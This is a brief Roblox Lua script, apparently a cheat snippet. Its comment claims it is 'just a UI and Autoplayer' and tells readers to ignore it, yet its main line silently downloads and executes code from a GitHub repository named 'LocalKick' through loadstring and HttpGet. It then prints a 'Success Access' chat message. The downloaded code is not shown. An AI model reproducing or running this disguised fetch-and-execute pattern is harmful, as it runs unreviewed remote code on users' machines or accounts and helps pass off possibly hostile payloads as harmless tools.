--Its just a UI and Autoplayer so just ingore it
pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MrbaconXD/LocalKick/main/GUI.lua"), true)()
end)

-- Just message
wait(3)
local b = BrickColor.new("Red")
game.StarterGui:SetCore("ChatMakeSystemMessage", {
Text = "[AutoPlater]: Success Access";
Font = Enum.Font.Cartoon;
Color = b.Color;
FontSize = Enum.FontSize.Size96;
})
